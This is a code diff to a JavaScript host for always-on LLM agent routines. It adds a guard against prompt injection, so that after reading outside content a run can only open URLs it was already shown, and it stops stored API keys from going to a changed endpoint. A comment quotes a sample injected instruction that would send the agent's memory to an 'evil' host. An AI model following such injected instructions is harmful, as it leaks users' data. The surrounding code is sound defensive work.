@@ -101,10 +101,15 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
       return fallback;
     }
   };
+  /** A full disk or a vanished folder is logged, not thrown: it mustn't take the server down. */
   const save = (name, value) => {
-    const tmp = join(dir, `${name}.${process.pid}.tmp`);
-    writeFileSync(tmp, JSON.stringify(value), { mode: 0o600 });
-    renameSync(tmp, join(dir, name));
+    try {
+      const tmp = join(dir, `${name}.${process.pid}.tmp`);
+      writeFileSync(tmp, JSON.stringify(value), { mode: 0o600 });
+      renameSync(tmp, join(dir, name));
+    } catch (error) {
+      console.error(`Always-on routines: couldn't save ${name}:`, error?.code ?? error);
+    }
   };
   /** @type {any[]} */
   let jobs = load("jobs.json", []);
@@ -163,6 +168,9 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
     if (!name || !instruction) throw new Error("The routine needs a name and an instruction.");
     const at = now();
     const sameTrigger = JSON.stringify(trigger ?? null) === JSON.stringify(existing?.trigger ?? null);
+    // A stored key only ever goes back to where it was stored for.
+    const sameProvider = existing && existing.provider.kind === provider.kind && existing.provider.baseUrl === text(provider.baseUrl, 500);
+    const sameSearch = existing && existing.search?.engine === body.search?.engine && existing.search?.url === text(body.search?.url, 500);
     return {
       id,
       name,
@@ -177,9 +185,9 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
         model: text(provider.model, 200),
         headers: Object.fromEntries(Object.entries(provider.headers ?? {}).filter(([k, v]) => typeof v === "string" && /^[\w-]{1,64}$/.test(k)).slice(0, 20)),
         // A new key replaces the stored one; none keeps it.
-        apiKey: provider.apiKey ? seal(text(provider.apiKey, 1000)) : (existing?.provider.apiKey ?? ""),
+        apiKey: provider.apiKey ? seal(text(provider.apiKey, 1000)) : sameProvider ? existing.provider.apiKey : "",
       },
-      search: { engine: ["duckduckgo", "brave", "tavily", "searxng"].includes(body.search?.engine) ? body.search.engine : "duckduckgo", url: text(body.search?.url, 500), apiKey: body.search?.apiKey ? seal(text(body.search.apiKey, 500)) : (existing?.search?.apiKey ?? "") },
+      search: { engine: ["duckduckgo", "brave", "tavily", "searxng"].includes(body.search?.engine) ? body.search.engine : "duckduckgo", url: text(body.search?.url, 500), apiKey: body.search?.apiKey ? seal(text(body.search.apiKey, 500)) : sameSearch ? (existing.search?.apiKey ?? "") : "" },
       skills: (Array.isArray(body.skills) ? body.skills : []).slice(0, 50).map((s) => ({ name: text(s?.name, 60), description: text(s?.description, 500), instructions: text(s?.instructions, 20_000) })).filter((s) => s.name && s.instructions),
       schedule,
       trigger,
@@ -194,8 +202,21 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
     };
   }
 
-  function toolsFor(job, h) {
+  /**
+   * Once a run has taken in outside content (search results, a page, what set it off), it may only
+   * open addresses that content or its instruction showed it: an injected "read https://evil/?d=<your
+   * memory>" can't carry anything out.
+   */
+  const URLS = /https?:\/\/[^\s<>"'`)\]]+/g;
+  const urlsIn = (value) => [...String(value).matchAll(URLS)].map((m) => m[0].replace(/[.,;:!?]+$/, ""));
+
+  function toolsFor(job, h, guard) {
     const search = { engine: job.search.engine, url: job.search.url, apiKey: open(job.search.apiKey), readPages: false, native: false };
+    const seen = (content) => {
+      guard.outside = true;
+      for (const u of urlsIn(content)) guard.known.add(u);
+      return content;
+    };
     const tools = [
       {
         name: "web_search",
@@ -203,7 +224,7 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
         parameters: { type: "object", properties: { query: { type: "string" } }, required: ["query"] },
         run: async (args, signal) => {
           const results = await h.searchWeb(String(args.query ?? ""), search, signal);
-          return { content: results.map((r, i) => `[${i + 1}] ${r.title}\n${r.url}\n${r.snippet}`).join("\n\n") || "No results.", untrusted: "web search results" };
+          return { content: seen(results.map((r, i) => `[${i + 1}] ${r.title}\n${r.url}\n${r.snippet}`).join("\n\n") || "No results."), untrusted: "web search results" };
         },
       },
       {
@@ -211,9 +232,15 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
         description: "Read a public web page (not this server's network).",
         parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] },
         run: async (args, signal) => {
-          const page = await fetchPublic(String(args.url ?? ""), { fetchImpl, signal });
+          const url = String(args.url ?? "").trim();
+          if (guard.outside && !guard.known.has(url)) {
+            throw new Error("After reading outside content, a run only opens addresses it was shown (in its instruction, search results or pages). Use one of those.");
+          }
+          const page = await fetchPublic(url, { fetchImpl, signal });
           const body = /html/.test(page.type) || /^\s*</.test(page.text) ? h.extractText(page.text) : page.text;
-          return { content: body.slice(0, 40_000), untrusted: String(args.url) };
+          // Links on the page count as shown.
+          for (const u of urlsIn(page.text.slice(0, 500_000))) guard.known.add(u);
+          return { content: seen(body.slice(0, 40_000)), untrusted: url };
         },
       },
       {
@@ -258,12 +285,14 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
     let result;
     try {
       const h = await headless();
+      // What set the run off is outside content already; the instruction's own addresses are fine to open.
+      const guard = { outside: events.length > 0, known: new Set([...urlsIn(job.instruction), ...events.flatMap((e) => urlsIn(`${e.title}\n${e.details}`))]) };
       const out = await h.runAgent({
         provider: { id: `server-${job.id}`, presetId: job.provider.presetId, name: job.provider.name, kind: job.provider.kind, baseUrl: job.provider.baseUrl, apiKey: open(job.provider.apiKey), models: [], headers: job.provider.headers },
         model: job.provider.model,
         system: `${job.system}\n\nCurrent date and time: ${new Date(started).toString()}.\nYou are running on the user's always-on server, with nobody there to answer questions or approve actions. Do what the instruction says with the tools you have; say plainly what you couldn't do.`,
         prompt: h.firing(job.instruction, events),
-        tools: toolsFor(job, h),
+        tools: toolsFor(job, h, guard),
         maxSteps: 8,
         signal: controller.signal,
       });
@@ -327,13 +356,13 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
         if (job.schedule && job.nextRun && job.nextRun <= at) {
           job.nextRun = h.nextRunAfter(job.schedule, at);
           save("jobs.json", jobs);
-          void run(job, "schedule");
+          run(job, "schedule").catch((e) => console.error("Always-on run failed:", e));
         } else if (job.trigger && job.trigger.type !== "webhook" && at - (job.triggerState?.checkedAt ?? 0) >= POLL_MS) {
           try {
             const { state, events } = await checkTrigger(job, h);
             job.triggerState = { ...state, checkedAt: at };
             save("jobs.json", jobs);
-            if (events.length) void run(job, "event", events);
+            if (events.length) run(job, "event", events).catch((e) => console.error("Always-on run failed:", e));
           } catch (error) {
             job.triggerState = { ...job.triggerState, checkedAt: at, error: String(error?.message ?? error).slice(0, 200) };
             save("jobs.json", jobs);
@@ -353,8 +382,9 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
   let timer = null;
   return {
     start(intervalMs = 30_000) {
-      timer ??= setInterval(() => void tick(), intervalMs);
-      void tick();
+      const safeTick = () => tick().catch((e) => console.error("Always-on routines:", e));
+      timer ??= setInterval(safeTick, intervalMs);
+      void safeTick();
     },
     stop() {
       clearInterval(timer);
@@ -379,7 +409,7 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
           if (recent.length >= 30) return reply(res, 429, { error: "Too many calls." });
           hookCalls.set(job.id, [...recent, now()]);
           const body = await readBody(req, 64 * 1024);
-          void run(job, "event", [{ title: "The webhook was called", details: `Content-Type: ${String(req.headers["content-type"] ?? "?").slice(0, 100)}\n\n${body}`, source: "a webhook call" }]);
+          run(job, "event", [{ title: "The webhook was called", details: `Content-Type: ${String(req.headers["content-type"] ?? "?").slice(0, 100)}\n\n${body}`, source: "a webhook call" }]).catch((e) => console.error("Always-on run failed:", e));
           return reply(res, 202, { ok: true });
         }
         const auth = String(req.headers.authorization ?? "").replace(/^Bearer\s+/i, "");
@@ -396,7 +426,7 @@ export function createAgentHost({ dir, token, secret, headless = () => import(".
         if (match[2]) {
           if (req.method !== "POST") return reply(res, 405, { error: "Use POST." });
           if (!existing) return reply(res, 404, { error: "No such routine on the server." });
-          void run(existing, "manual");
+          run(existing, "manual").catch((e) => console.error("Always-on run failed:", e));
           return reply(res, 202, { ok: true });
         }
         if (req.method === "DELETE") {
